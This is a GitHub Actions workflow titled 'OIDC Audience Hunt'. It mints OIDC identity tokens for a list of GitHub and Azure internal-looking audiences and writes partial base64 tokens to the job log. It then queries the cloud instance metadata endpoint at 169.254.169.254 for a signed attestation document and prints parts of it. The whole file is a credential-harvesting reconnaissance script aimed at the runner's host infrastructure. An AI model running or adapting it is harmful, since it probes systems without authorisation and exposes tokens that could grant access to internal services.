name: OIDC Audience Hunt
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Try multiple OIDC audiences and test against GitHub internal services
        run: |
          get_oidc_token() {
            local audience="$1"
            curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$audience" \
              | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('value',''); print(t)" 2>/dev/null
          }
          
          echo "=== Try GitHub internal services with OIDC tokens ==="
          
          # Audiences found in infrastructure
          for aud in "api://hosted-compute-ro" "api://AzureADTokenExchange" "https://github.com/actions" \
            "githubactions" "github-actions" "api://github-actions-runner" "sigstore" \
            "api://copilot" "api://github-copilot"; do
            TOKEN=$(get_oidc_token "$aud")
            TOKEN_B64=$(echo -n "$TOKEN" | base64 -w0)
            if [ -n "$TOKEN" ] && [ "$TOKEN" != "ERROR" ]; then
              echo "GOT TOKEN for $aud: TOKEN_B64=${TOKEN_B64:0:50}..."
            else
              echo "FAILED for $aud"
            fi
          done
          
          echo ""
          echo "=== IMDS attested document ==="
          curl -s -m 5 "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=test123" \
            -H "Metadata: true" | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
sig = d.get('signature','')
doc = d.get('document','')
print('signature_prefix:', sig[:50])
print('document_b64:', doc[:200])
" 2>/dev/null || echo "IMDS attested failed"
